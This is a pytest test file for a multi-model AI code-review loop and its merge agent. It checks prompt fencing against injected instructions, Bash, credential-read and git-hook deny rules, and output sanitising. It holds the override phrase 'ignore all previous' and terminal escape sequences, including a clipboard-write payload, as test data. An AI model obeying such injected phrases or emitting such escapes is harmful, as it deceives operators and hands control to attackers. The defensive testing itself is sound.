        assert "not a clean bill" in line

    def test_a_small_diff_with_no_findings_is_unremarkable(self) -> None:
        from scripts.review_until_converged import _describe_results

        line = _describe_results([{"findings": []}], 12)
        assert "found nothing" in line
        assert "not a clean bill" not in line

    def test_everyone_speaking_needs_no_caveat(self) -> None:
        from scripts.review_until_converged import _describe_results

        results = [{"findings": [{"severity": "warning"}]}] * 4
        assert (
            _describe_results(results, 5000) == "Results: 4/4 reviewers returned output"
        )


class TestDiffBudget:
    """Naming a generated file that is crowding the review out."""

    def _diff(self, *files: tuple[str, int]) -> str:
        parts = [
            f"diff --git a/{name} b/{name}\n" + "x\n" * lines for name, lines in files
        ]
        return "".join(parts)

    def test_a_lockfile_dominating_the_diff_is_named(self) -> None:
        """It was 69% of a real review: four models paid to read a lockfile."""
        from scripts.review_loop.diff import dominant_files

        (note,) = dominant_files(
            self._diff(("package-lock.json", 9000), ("app.py", 4000))
        )
        assert "package-lock.json is 69% of this diff" in note
        assert "linguist-generated=true" in note

    def test_a_small_diff_is_left_alone(self) -> None:
        """Half of sixty lines is a small change, not a problem."""
        from scripts.review_loop.diff import dominant_files

        assert dominant_files(self._diff(("a.py", 30), ("b.py", 30))) == []

    def test_a_balanced_large_diff_is_left_alone(self) -> None:
        from scripts.review_loop.diff import dominant_files

        assert (
            dominant_files(self._diff(("a.py", 900), ("b.py", 900), ("c.py", 900)))
            == []
        )

    def test_an_empty_diff_says_nothing(self) -> None:
        from scripts.review_loop.diff import dominant_files

        assert dominant_files("") == []


class TestReviewerDeadline:
    """How long a reviewer gets, and what happens when it runs out."""

    def test_a_bigger_diff_earns_more_time(self) -> None:
        """The reviewer that runs out is the one with the most to say."""
        from scripts.review_loop.config import reviewer_timeout

        assert reviewer_timeout(5000) > reviewer_timeout(200)

    def test_there_is_a_ceiling(self) -> None:
        from scripts.review_loop.config import REVIEWER_TIMEOUT_MAX, reviewer_timeout

        assert reviewer_timeout(10_000_000) == REVIEWER_TIMEOUT_MAX

    def test_the_environment_can_override_it(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.review_loop.config import reviewer_timeout

        monkeypatch.setenv("REVIEWER_TIMEOUT", "42")
        assert reviewer_timeout(5000) == 42

    def test_a_codex_answer_that_lands_after_the_deadline_is_recognised(
        self, tmp_path: Path
    ) -> None:
        """A killed reviewer's helper can outlive it and write minutes later."""
        from scripts.review_loop.reviewers import _has_codex_answer

        assert not _has_codex_answer(tmp_path, 2)
        (tmp_path / "codex-out-2.txt").write_text("{}")
        assert _has_codex_answer(tmp_path, 2)

    def test_an_empty_codex_answer_is_not_an_answer(self, tmp_path: Path) -> None:
        from scripts.review_loop.reviewers import _has_codex_answer

        (tmp_path / "codex-out-2.txt").write_text("")
        assert not _has_codex_answer(tmp_path, 2)


class TestSalvagingProse:
    """A reviewer that answers in prose has still reviewed something."""

    def test_a_prose_reply_is_put_in_front_of_the_operator(
        self, tmp_path: Path
    ) -> None:
        """This is not hypothetical: one was binned carrying a real finding.

        It noticed twelve duplicated tests, wrote it as a paragraph instead of
        the schema, and the round recorded it as having returned nothing.
        """
        (tmp_path / "raw-3.txt").write_text(
            json.dumps({"result": "test_app_sockets.py duplicates 12 tests verbatim."})
        )
        summary = describe_outputs(tmp_path, {})
        assert "NOT JSON" in summary
        assert "duplicates 12 tests verbatim" in summary
        assert "raw-3.txt" in summary

    def test_a_reviewer_that_wrote_nothing_is_reported_differently(
        self, tmp_path: Path
    ) -> None:
        """ "No output" and "unusable output" read as one thing and are not."""
        summary = describe_outputs(tmp_path, {})
        assert "NO OUTPUT" in summary
        assert "NOT JSON" not in summary

    def test_an_empty_raw_file_counts_as_nothing(self, tmp_path: Path) -> None:
        """codex writes its answer to codex-out-N.txt (-o), so its raw file is empty."""
        (tmp_path / "raw-2.txt").write_text("")
        assert "NO OUTPUT" in describe_outputs(tmp_path, {})

    def test_bare_prose_is_salvaged_too(self, tmp_path: Path) -> None:
        """Not every backend wraps its reply in an envelope."""
        (tmp_path / "raw-1.txt").write_text("The diff looks fine to me.")
        assert "looks fine to me" in describe_outputs(tmp_path, {})

    def test_a_long_reply_is_trimmed_not_dumped(self, tmp_path: Path) -> None:
        (tmp_path / "raw-1.txt").write_text("x" * 5000)
        assert len(describe_outputs(tmp_path, {})) < 2000

    def test_a_failed_agy_turn_leads_with_its_error(self, tmp_path: Path) -> None:
        """Measured: the quota ran out after agy had drafted a whole review.

        The draft was shown as a reply in prose, and the reason -- the quota -- was not.
        """
        result = {
            "status": "ERROR",
            "response": '{"reviewer": "readability_performance", "findings": []}',
            "error": "Individual quota reached. Resets in 155h25m52s.",
        }
        (tmp_path / "raw-3.txt").write_text(
            json.dumps({"event": "result", "result": result}) + "\n"
        )
        summary = describe_outputs(tmp_path, {3: "agy"})
        assert "FAILED" in summary and "status ERROR" in summary
        assert "Individual quota reached" in summary
        assert "NOT JSON" not in summary and "readability_performance" not in summary

    def test_invisible_characters_are_made_visible(self) -> None:
        # Bidi controls reorder what the operator reads without any terminal escape;
        # a list of ranges missed some each time it was reviewed.
        from scripts.review_loop.results import printable

        assert printable("ok\u202edlrow\u200b\ufeff") == "ok?dlrow??"
        # A lone surrogate, which a JSON "\\ud800" decodes to, raised on printing.
        hidden = "\u061c\u2028\u2029\u00ad\U000e0041\x1b\ud800\ue000"
        assert printable(hidden) == "?" * len(hidden)
        assert printable("tab\tline\nü — ok") == "tab\tline\nü — ok"

    def test_codexs_unusable_answer_is_shown(self, tmp_path: Path) -> None:
        # Its answer is codex-out-N.txt; read from its empty stdout, it was "NO OUTPUT".
        (tmp_path / "raw-2.txt").write_text("")
        (tmp_path / "codex-out-2.txt").write_text("I reviewed it and it looks fine.")
        summary = describe_outputs(tmp_path, {2: "codex"})
        assert "NOT JSON" in summary and "looks fine" in summary
        assert "codex-out-2.txt" in summary

    def test_terminal_escapes_are_not_passed_to_the_terminal(
        self, tmp_path: Path
    ) -> None:
        # The reply is shaped by the diff; an escape sequence can hide the lines above it.
        result = {"status": "ERROR", "error": "quota\x1b[2K\x1b]52;c;cGF5bG9hZA==\x07"}
        (tmp_path / "raw-3.txt").write_text(
            json.dumps({"event": "result", "result": result}) + "\n"
        )
        (tmp_path / "raw-1.txt").write_text("fine\x1b[1A\x1b[2Kforged")
        summary = describe_outputs(tmp_path, {3: "agy"})
        assert "\x1b" not in summary and "\x07" not in summary
        assert "quota?[2K" in summary and "fine?[1A" in summary

    def test_the_key_names_the_backend_marker(self, tmp_path: Path) -> None:
        # Which CLI ran a slot decides how its raw output is read.
        write_artifacts_key(tmp_path)
        key = (tmp_path / "ARTIFACTS.md").read_text(encoding="utf-8")
        assert "`backend-N.txt`" in key and "stream-json" in key

    def test_a_reviewer_with_findings_is_left_alone(self, tmp_path: Path) -> None:
        (tmp_path / "result-1.json").write_text("{}")
        summary = describe_outputs(tmp_path, {}, n_slots=1)
        assert "result-{1}.json" in summary
        assert "NOT JSON" not in summary


class TestSchemaInstruction:
    """Telling a reviewer what to do when it has nothing to say."""

    def test_the_prompt_says_prose_is_discarded(self) -> None:
        """The commonest failure is not silence; it is an unparseable answer."""
        from scripts.review_loop.reviewers import build_reviewer_prompt

        prompt = build_reviewer_prompt(
            "security", "leaks", "R1", "opus", "+x", "{}", "c"
        )
        assert "empty list" in prompt
        assert "discarded unread" in prompt


class TestProjectGate:
    """Whose gate the loop runs, and with which Python."""

    def test_a_project_with_its_own_gate_script_gets_only_that(
        self, tmp_path: Path
    ) -> None:
        """The built-in `mypy scripts/` type-checks the agent's vendored source.

        Under a host project's own strict settings that always fails, so the
        loop could never commit a round no matter what it fixed.
        """
        from scripts.review_loop.config import project_gate

        repo = tmp_path / "host"
        (repo / "tools").mkdir(parents=True)
        gate = repo / "tools" / "gate.sh"
        gate.write_text("#!/bin/sh\nexit 0\n")
        gate.chmod(0o755)
        assert project_gate(repo) == gate

    def test_a_gate_script_that_is_not_executable_is_not_used(
        self, tmp_path: Path
    ) -> None:
        from scripts.review_loop.config import project_gate

        repo = tmp_path / "host"
        (repo / "tools").mkdir(parents=True)
        (repo / "tools" / "gate.sh").write_text("#!/bin/sh\nexit 0\n")
        assert project_gate(repo) is None

    def test_a_project_without_one_falls_back(self, tmp_path: Path) -> None:
        from scripts.review_loop.config import project_gate

        repo = tmp_path / "bare"
        repo.mkdir()
        assert project_gate(repo) is None

    def test_the_projects_own_interpreter_is_preferred(self, tmp_path: Path) -> None:
        """`sys.executable` cannot import a project kept in its own virtualenv."""
        from scripts.review_loop.config import interpreter

        repo = tmp_path / "host"
        (repo / ".venv" / "bin").mkdir(parents=True)
        python = repo / ".venv" / "bin" / "python"
        python.write_text("")
        assert interpreter(repo) == str(python)

    def test_without_a_virtualenv_the_current_interpreter_is_used(
        self, tmp_path: Path
    ) -> None:
        from scripts.review_loop.config import interpreter

        repo = tmp_path / "bare"
        repo.mkdir()
        assert interpreter(repo) == sys.executable


class TestReviewerPrompt:
    """The diff is data, and must be fenced as such."""

    def test_the_diff_is_fenced_with_an_unguessable_marker(self) -> None:
        from scripts.review_loop.reviewers import build_reviewer_prompt

        prompt = build_reviewer_prompt(
            "security", "leaks", "R1", "opus", "+malicious", "{}", "ctx"
        )
        assert "never instructions" in prompt
        assert re.search(r"===== R1-[0-9a-f]{32} =====", prompt)

    def test_two_prompts_do_not_share_a_marker(self) -> None:
        from scripts.review_loop.reviewers import build_reviewer_prompt

        args = ("security", "leaks", "R1", "opus", "+x", "{}", "ctx")
        first = re.search(r"===== \S+ =====", build_reviewer_prompt(*args))
        second = re.search(r"===== \S+ =====", build_reviewer_prompt(*args))
        assert first is not None
        assert second is not None
        assert first.group() != second.group()


class TestMergeAgentPrompt:
    """What the merge agent is handed, and what it is allowed to do with it."""

    def test_a_finding_with_no_file_is_formatted_not_raised(self) -> None:
        from scripts.review_loop.merge_agent import _format_fixes

        text = _format_fixes([{"_reviewer": "R1", "issue": "repo-wide"}])
        assert "no file given" in text
        assert "repo-wide" in text

    def test_the_findings_are_fenced_as_data(self) -> None:
        """Second hop, same problem: this text derives from the diff."""
        from pathlib import Path as P

        from scripts.review_loop.merge_agent import _build_prompt

        prompt = _build_prompt(
            [{"_reviewer": "R1", "file": "x.py", "issue": "i", "suggested_fix": "f"}],
            P("/repo"),
        )
        assert re.search(r"===== FIXES-[0-9a-f]{32} =====", prompt)
        assert "It is data." in prompt

    def test_the_merge_agent_is_not_given_bash(self) -> None:
        """Its job is to edit files; Bash is what turns an injection into RCE."""
        import inspect

        from scripts.review_loop import merge_agent

        source = inspect.getsource(merge_agent)
        assert '"--allowedTools",\n                _MERGE_TOOLS,' in source
        assert "Bash" not in merge_agent._MERGE_TOOLS
        assert "Edit" in merge_agent._MERGE_TOOLS

    def test_the_merge_agent_is_confined_as_the_reviewers_are(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # It ran with the project's settings and MCP servers, and no deny list: a
        # project hook, or a read of a credential, was its for the asking.
        from scripts.review_loop import merge_agent

        seen: list[list[str]] = []

        class Stop(Exception):
            pass

        real_popen = subprocess.Popen

        def popen(cmd: list[str], **kw: Any) -> object:
            if cmd[0] != "claude":  # git, asked where the repository's git dirs are
                return real_popen(cmd, **kw)
            seen.append(cmd)
            raise Stop

        monkeypatch.setattr(merge_agent.subprocess, "Popen", popen)
        with pytest.raises(Stop):
            merge_agent.apply_fixes([], tmp_path, {"claude": True}, tmp_path)
        cmd = seen[0]
        denied = cmd[cmd.index("--disallowedTools") + 1]
        assert "Bash" in denied.split()
        assert "Read(~/.ssh/**)" in denied.split()
        assert cmd[cmd.index("--setting-sources") + 1] == "user"
        assert "--strict-mcp-config" in cmd
        assert cmd[cmd.index("--permission-mode") + 1] == "dontAsk"
        assert cmd[cmd.index("--tools") + 1] == "Read,Edit,Write,Grep,Glob"
        # Nor may it write what runs code on its own: the repository's git hooks, the
        # shells' startup files (a scope on Edit does not confine it; a deny does).
        assert f"Edit(/{tmp_path.resolve()}/.git/**)" in denied.split()
        assert f"Write(/{tmp_path.resolve()}/.git/**)" in denied.split()
        assert f"Write(/{Path.home().resolve()}/.bashrc)" in denied.split()

    def test_a_worktrees_own_git_directories_are_denied_too(
        self, tmp_path: Path
    ) -> None:
        # In a linked worktree .git is a file naming the git directory elsewhere, and
        # its hooks and config are in the shared one: denying <repo>/.git/** left both
        # writable.
        from scripts.review_loop import merge_agent

        main = tmp_path / "main"
        subprocess.run(["git", "init", "-q", str(main)], check=True)
        subprocess.run(
            ["git", "-C", str(main), "-c", "user.email=a@b", "-c", "user.name=a",
             "commit", "-q", "--allow-empty", "-m", "x"],
            check=True,
        )  # fmt: skip
        tree = tmp_path / "tree"
        subprocess.run(
            ["git", "-C", str(main), "worktree", "add", "-q", str(tree)], check=True
        )
        denied = merge_agent._merge_denied(tree)
        common = (main / ".git").resolve()
        assert f"Write(/{common}/**)" in denied
        own = next(p for p in (common / "worktrees").iterdir())
        assert f"Edit(/{own.resolve()}/**)" in denied
        assert f"Edit(/{tree.resolve()}/.git)" in denied

    def test_a_repository_in_a_home_dot_directory_stays_editable(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        # Denied every home dotfile and dot-directory, the agent could not fix a
        # repository kept in one (~/.worktrees/project).
        from scripts.review_loop import merge_agent

        monkeypatch.setenv("HOME", str(tmp_path))
        hidden = tmp_path / ".worktrees" / "project"
        hidden.mkdir(parents=True)
        (tmp_path / ".bashrc.d").mkdir()
        monkeypatch.setattr(merge_agent, "_homes", lambda: {tmp_path})
        denied = merge_agent._merge_denied(hidden)
        assert f"Write(/{tmp_path}/.*/**)" not in denied
        # The others stay denied, one by one: dropping them all left them writable.
        assert f"Write(/{tmp_path / '.bashrc.d'}/**)" in denied
        assert f"Write(/{tmp_path / '.worktrees'}/**)" not in denied
        # Other worktrees beside it are not this one.
        (tmp_path / ".worktrees" / "other").mkdir()
        denied = merge_agent._merge_denied(hidden)
        assert f"Write(/{tmp_path / '.worktrees' / 'other'}/**)" in denied
        # A repository under ~/.local, which is denied whole, stays editable too.
        local = tmp_path / ".local" / "src" / "project"
        local.mkdir(parents=True)
        (tmp_path / ".local" / "bin").mkdir()
        denied = merge_agent._merge_denied(local)
        assert f"Write(/{tmp_path}/.local/**)" not in denied
        assert f"Write(/{local.resolve()}/**)" not in denied
        assert f"Write(/{tmp_path / '.local' / 'bin'}/**)" in denied
        # Where HOME points elsewhere and the repository is in the account's home, the
        # exception is that home's: the other keeps its denies, dot entries and all.
        other = tmp_path / "other-home"
        other.mkdir()
        monkeypatch.setattr(merge_agent, "_homes", lambda: {other, tmp_path})
        denied = merge_agent._merge_denied(hidden)
        assert f"Write(/{tmp_path}/.*/**)" not in denied
        assert f"Write(/{other}/.*/**)" in denied
        assert f"Write(/{other}/.bashrc)" in denied
        assert f"Write(/{tmp_path}/.bashrc)" in denied
        monkeypatch.setattr(merge_agent, "_homes", lambda: {tmp_path})
        plain = tmp_path / "code" / "project"
        plain.mkdir(parents=True)
        denied = merge_agent._merge_denied(plain)
        assert f"Write(/{tmp_path}/.*/**)" in denied
        # Every repository's git directory, and this agent's own checkout.
        assert "Write(//**/.git/**)" in denied
        assert f"Write(/{REPO_ROOT.resolve()}/**)" in denied
        # CI definitions, which --auto-commit would push and CI would run.
        assert f"Write(/{plain.resolve()}/.github/**)" in denied

    def test_a_home_no_rule_can_name_falls_back_to_its_tilde_form(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        # Dropped in silence, its denies were gone altogether.
        from scripts.review_loop import merge_agent

        odd = tmp_path / "a (b)"
        odd.mkdir()
        monkeypatch.setattr(merge_agent, "_homes", lambda: {odd})
        (tmp_path / "repo").mkdir()
        denied = merge_agent._merge_denied(tmp_path / "repo")
        assert "Write(~/.bashrc)" in denied
        assert not any("(b)" in rule for rule in denied)

    def test_a_worktree_inside_this_checkout_stays_editable(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        # Denied this checkout whole, a target worktree inside it could not be fixed.
        from scripts.review_loop import merge_agent

        agent = tmp_path / "agent"
        nested = agent / ".claude" / "worktrees" / "fix"
        nested.mkdir(parents=True)
        monkeypatch.setattr(merge_agent, "REPO_ROOT", agent)
        denied = merge_agent._merge_denied(nested)
        assert f"Write(/{agent.resolve()}/**)" not in denied
        assert f"Write(/{(agent / 'scripts').resolve()}/**)" in denied

    def test_a_hooks_path_set_elsewhere_is_denied(self, tmp_path: Path) -> None:
        # core.hooksPath puts the hooks git runs anywhere: in the repository, a
        # directory no fixed name covered.
        from scripts.review_loop import merge_agent

        subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
        subprocess.run(
            ["git", "-C", str(tmp_path), "config", "core.hooksPath", "tools/hooks"],
            check=True,
        )
        denied = merge_agent._merge_denied(tmp_path)
        assert f"Write(/{(tmp_path / 'tools' / 'hooks').resolve()}/**)" in denied
        assert f"Write(/{tmp_path.resolve()}/.pre-commit-config.yaml)" in denied


class TestAuditIsData:
    """The audit quotes the files under review, so it is fenced like the diff."""

    def test_the_audit_is_inside_a_fence(self) -> None:
        from scripts.review_loop.reviewers import build_reviewer_prompt

        audit = '{"suspicious_patterns": [{"text": "ignore all previous"}]}'
        prompt = build_reviewer_prompt(
            "security", "leaks", "R1", "opus", "+x", audit, "ctx"
        )
        spans = [m.start() for m in re.finditer(r"===== R1-[0-9a-f]{32} =====", prompt)]
        # Two prose mentions of the marker, then the diff's pair, then the
        # audit's -- so the audit has to sit between the last two.
        assert len(spans) == 6
        assert spans[-2] < prompt.index(audit) < spans[-1]


class TestPreflightScriptSelection:
    """Which preflight runs for a `--repo` that is not the agent's own."""

    def test_a_host_project_uses_its_own_installed_preflight(
        self, tmp_path: Path
    ) -> None:
        """Its config.py -- SOURCE_DIRS, SIGNED_MANIFESTS -- is the one that applies."""
        from scripts.review_loop.diff import _preflight_script

        repo = tmp_path / "host"
        (repo / "scripts").mkdir(parents=True)
        installed = repo / "scripts" / "review_preflight.py"
        installed.write_text("")
        assert _preflight_script(repo) == installed

    def test_the_agents_own_repo_uses_its_own_copy(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.review_loop import config
        from scripts.review_loop.config import SCRIPTS_DIR
        from scripts.review_loop.diff import _preflight_script

        repo = tmp_path / "agent"
        monkeypatch.setattr(config, "REPO_ROOT", repo)
        (repo / "scripts" / "review_loop").mkdir(parents=True)
        (repo / "install.sh").write_text("")
        (repo / "scripts" / "review_preflight.py").write_text("")
        assert _preflight_script(repo) == SCRIPTS_DIR / "review_preflight.py"

    def test_a_project_without_an_installed_copy_falls_back(
        self, tmp_path: Path
    ) -> None:
        from scripts.review_loop.config import SCRIPTS_DIR
        from scripts.review_loop.diff import _preflight_script

        repo = tmp_path / "bare"
        repo.mkdir()
        assert _preflight_script(repo) == SCRIPTS_DIR / "review_preflight.py"


class TestSourceDirsConfigurable:
    """Coverage gate must surface when SOURCE_DIRS doesn't match anything."""

    def test_warning_emitted_when_python_files_outside_source_dirs(self) -> None:
        from scripts.preflight.coverage import measure_test_coverage

        warnings: list[str] = []
        # Simulate a backend/app project: changed Python files exist but
        # none under the default src/ or research/ prefixes.
        changed = ["backend/views.py", "backend/models.py"]
        result = measure_test_coverage(changed, warnings)
        assert result == []
        assert len(warnings) == 1
        assert "coverage gate inoperative" in warnings[0]
        assert "SOURCE_DIRS" in warnings[0]

    def test_no_warning_when_no_python_files(self) -> None:
        from scripts.preflight.coverage import measure_test_coverage

        warnings: list[str] = []
        # Doc-only or config-only diff: nothing to measure, no warning.
        result = measure_test_coverage(["docs/foo.md", "config.yaml"], warnings)
        assert result == []
        assert warnings == []


class TestCoverageSourceSpec:
    """The coverage gate must actually collect data, not fail open.

    coverage.py resolves a --cov value as an importable package name or a
    directory. It cannot use an individual .py path. When changed files were
    passed as sources, coverage collected nothing and wrote no JSON report, so
    measure_test_coverage() returned [] -- indistinguishable from "no gaps".
    These tests pin both halves: the argv shape, and an end-to-end measurement
    that must find a real gap.
    """

    def test_coverage_leaves_no_data_file_in_the_repository(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        # Left at the root, .coverage was an untracked file the next review took in.
        import scripts.preflight.coverage as cov_mod

        seen: dict[str, object] = {}

        def fake_run(cmd: list[str], **kwargs: object) -> subprocess.CompletedProcess:
            seen["env"] = kwargs.get("env")
            return subprocess.CompletedProcess(cmd, 1, "", "")

        (tmp_path / "src").mkdir()
        (tmp_path / "tests").mkdir()
        monkeypatch.setattr(cov_mod, "REPO_ROOT", tmp_path)
        monkeypatch.setattr(cov_mod, "SOURCE_DIRS", ["src/"])
        monkeypatch.delenv("PYTEST_CURRENT_TEST", raising=False)
        monkeypatch.setattr(cov_mod.subprocess, "run", fake_run)
        cov_mod._run_pytest_with_coverage([])
        data_file = Path(seen["env"]["COVERAGE_FILE"])  # type: ignore[index]
        assert not data_file.is_relative_to(tmp_path)

    def test_the_gate_does_not_run_inside_a_test_run(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # A project whose tests run the preflight had it run the suite, which ran the
        # preflight again, until something timed out.
        import scripts.preflight.coverage as cov_mod

        monkeypatch.setenv("PYTEST_CURRENT_TEST", "t.py::test (call)")
        warnings: list[str] = []
        assert cov_mod._run_pytest_with_coverage(warnings) is None
        assert "inside a test" in warnings[0]

    def test_cov_sources_are_directories_not_files(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        from scripts.preflight import coverage as cov_mod

        (tmp_path / "src").mkdir()
        (tmp_path / "tests").mkdir()
        monkeypatch.setattr(cov_mod, "REPO_ROOT", tmp_path)
        # The gate itself, which is skipped inside a test run.
        monkeypatch.delenv("PYTEST_CURRENT_TEST", raising=False)
        monkeypatch.setattr(cov_mod, "SOURCE_DIRS", ["src/"])

        captured: list[list[str]] = []

        def fake_run(cmd: list[str], **_kwargs: object) -> subprocess.CompletedProcess:
            captured.append(cmd)
            return subprocess.CompletedProcess(cmd, 0, "", "")

        monkeypatch.setattr(cov_mod.subprocess, "run", fake_run)
        cov_mod._run_pytest_with_coverage([])

        assert captured, "pytest was never invoked"
        cov_args = [a for a in captured[0] if a.startswith("--cov=")]
        assert cov_args == ["--cov=src"]
        assert not any(a.endswith(".py") for a in cov_args), (
            "a .py path as a coverage source collects nothing"
        )

    def test_no_source_dirs_on_disk_warns_instead_of_failing_open(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        from scripts.preflight import coverage as cov_mod

        monkeypatch.setattr(cov_mod, "REPO_ROOT", tmp_path)
        # The gate itself, which is skipped inside a test run.
        monkeypatch.delenv("PYTEST_CURRENT_TEST", raising=False)
        monkeypatch.setattr(cov_mod, "SOURCE_DIRS", ["nonexistent/"])

        warnings: list[str] = []
        assert cov_mod._run_pytest_with_coverage(warnings) is None
        assert len(warnings) == 1
        assert "coverage gate inoperative" in warnings[0]

    def test_end_to_end_gap_is_detected(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """The test that would have caught the original bug.

        A real project tree with a genuinely uncovered branch must produce a
        gap. Before the fix this returned [] and the branch went unreported.
        """
        from scripts.preflight import coverage as cov_mod

        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "mod.py").write_text(
            "def classify(n: int) -> str:\n"
            "    if n > 0:\n"
            "        return 'positive'\n"
            "    return 'other'\n"
        )
        (tmp_path / "tests").mkdir()
        (tmp_path / "tests" / "test_mod.py").write_text(
            "import sys\n"
            "from pathlib import Path\n"
            "sys.path.insert(0, str(Path(__file__).resolve().parent.parent / 'src'))\n"
            "from mod import classify\n"
            "\n"
            "def test_positive() -> None:\n"
            "    assert classify(1) == 'positive'\n"
        )

        monkeypatch.setattr(cov_mod, "REPO_ROOT", tmp_path)
        # The gate itself, which is skipped inside a test run.
        monkeypatch.delenv("PYTEST_CURRENT_TEST", raising=False)
        monkeypatch.setattr(cov_mod, "SOURCE_DIRS", ["src/"])
        monkeypatch.setattr(cov_mod, "COVERAGE_TARGET", 100)

        warnings: list[str] = []
        gaps = cov_mod.measure_test_coverage(["src/mod.py"], warnings)

        assert warnings == []
        assert len(gaps) == 1, f"expected one gap, got {gaps}"
        assert gaps[0]["file"] == "src/mod.py"
        assert gaps[0]["percent_covered"] < 100
        assert gaps[0]["uncovered_lines"], "the untaken return was not reported"


_GIT_ENV = {
    "GIT_AUTHOR_NAME": "t",
    "GIT_AUTHOR_EMAIL": "t@t",
    "GIT_COMMITTER_NAME": "t",
    "GIT_COMMITTER_EMAIL": "t@t",
}


class TestChangedFilesFallback:
    """The audit must not report an empty tree just because origin/main is absent."""

    def _repo(self, tmp_path: Path, n_commits: int) -> Path:
        repo = tmp_path / "repo"
        repo.mkdir()
        subprocess.run(
            ["git", "init", "-q", "-b", "main"], cwd=repo, check=True, env=_GIT_ENV
        )
        for i in range(n_commits):
            (repo / "x.py").write_text(f"a = {i}\n")
            subprocess.run(["git", "add", "x.py"], cwd=repo, check=True, env=_GIT_ENV)
            subprocess.run(
                ["git", "commit", "-q", "-m", f"c{i}"],
                cwd=repo,
                check=True,
                env=_GIT_ENV,
            )
        return repo

    def test_falls_back_to_head_parent_without_origin_main(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        from scripts.preflight import git_state

        monkeypatch.setattr(git_state, "REPO_ROOT", self._repo(tmp_path, 2))
        warnings: list[str] = []
        assert git_state._changed_vs_base(warnings) == "x.py"
        assert warnings == []

    def test_warns_when_no_base_resolves_at_all(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        from scripts.preflight import git_state

        monkeypatch.setattr(git_state, "REPO_ROOT", self._repo(tmp_path, 1))
        warnings: list[str] = []
        assert git_state._changed_vs_base(warnings) == ""
        assert len(warnings) == 1
        assert "could not resolve changed files" in warnings[0]


class TestVendoredExclusion:
    """A host project's review must not be spent on the reviewer's own source."""

    def _host_repo(self, tmp_path: Path) -> Path:
        """A host project with one vendored file and one of its own."""
        repo = tmp_path / "host"
        (repo / "scripts").mkdir(parents=True)
        (repo / "app").mkdir()
        subprocess.run(
            ["git", "init", "-q", "-b", "main"], cwd=repo, check=True, env=_GIT_ENV
        )
        (repo / "README.md").write_text("base\n")
        subprocess.run(["git", "add", "-A"], cwd=repo, check=True, env=_GIT_ENV)
        subprocess.run(
            ["git", "commit", "-q", "-m", "base"], cwd=repo, check=True, env=_GIT_ENV
        )
        (repo / "scripts" / "review_preflight.py").write_text("# vendored\n")
        (repo / "app" / "main.py").write_text("value = 1\n")
        subprocess.run(["git", "add", "-A"], cwd=repo, check=True, env=_GIT_ENV)
        subprocess.run(
            ["git", "commit", "-q", "-m", "work"], cwd=repo, check=True, env=_GIT_ENV
        )
        return repo

    def test_a_change_to_the_vendored_code_is_named(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # Left out of the diff, a change weakening the reviewer's own sandbox code ran
        # in full mode with no reviewer having seen it.
        from scripts.review_loop.diff import _warn_of_vendored_changes

        repo = self._host_repo(tmp_path)
        _warn_of_vendored_changes(repo, ["HEAD~1"])
        said = capsys.readouterr().out
        assert "scripts/review_preflight.py" in said and "not reviewed" in said
        _warn_of_vendored_changes(repo, ["--merge-base", "HEAD"])
        assert capsys.readouterr().out == ""
        # A new vendored file, untracked, counts as it does in the diff.
        (repo / "scripts" / "scrub_diff.py").write_text("# planted\n")
        _warn_of_vendored_changes(repo, ["--merge-base", "HEAD"])
        assert "scripts/scrub_diff.py" in capsys.readouterr().out
        # A range git cannot read is said, not taken for "nothing changed".
        _warn_of_vendored_changes(repo, ["--merge-base", "no-such-ref"])
        assert "could not tell" in capsys.readouterr().out

    def test_agent_repo_still_reviews_itself(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.review_loop import config
        from scripts.review_loop.config import diff_pathspec, is_agent_repo

        repo = tmp_path / "agent"
        (repo / "scripts" / "review_loop").mkdir(parents=True)
        (repo / "install.sh").write_text("#!/bin/sh\n")
        # A host with an install.sh of its own, reviewed from the agent's checkout, is
        # the host: the scrubber's fixture pass is for this repository only.
        assert not is_agent_repo(repo)

        monkeypatch.setattr(config, "REPO_ROOT", repo)
        assert is_agent_repo(repo)
        assert diff_pathspec(repo) == ["."]

    def test_a_worktree_of_the_agent_is_the_agent(self, tmp_path: Path) -> None:
        from scripts.review_loop.config import REPO_ROOT, _common_dir

        assert _common_dir(REPO_ROOT / "scripts") == _common_dir(REPO_ROOT)

    def test_host_project_excludes_the_vendored_paths(self, tmp_path: Path) -> None:
        from scripts.review_loop.config import (
            VENDORED_PATHS,
            diff_pathspec,
            is_agent_repo,
        )

        host = tmp_path / "host"
        host.mkdir()

        assert not is_agent_repo(host)
        spec = diff_pathspec(host)
        assert spec[0] == "."
        assert len(spec) == len(VENDORED_PATHS) + 1
        assert ":(exclude)scripts/review_loop" in spec

    def test_collect_diff_omits_vendored_but_keeps_project_code(
        self, tmp_path: Path
    ) -> None:
        """The end-to-end shape: the reviewer sees app/, never scripts/."""
        from unittest.mock import patch

        from scripts.review_loop.diff import collect_diff

        repo = self._host_repo(tmp_path)
        round_dir = tmp_path / "round"
        round_dir.mkdir()

        with patch("scripts.review_loop.diff.SCRIPTS_DIR", REPO_ROOT / "scripts"):
            diff_path, _n_lines = collect_diff(round_dir, repo)

        diff = diff_path.read_text()
        assert "app/main.py" in diff
        assert "scripts/review_preflight.py" not in diff


def _threaded_into_the_round(argument: str) -> bool:
    """Whether ``argument`` is passed in the `_run_one_round` call.

    Reads the call rather than looking for the argument immediately before the
    closing paren. The "is it last" form broke the first time an argument was
    added after it -- which is the one change it existed to survive.
    """
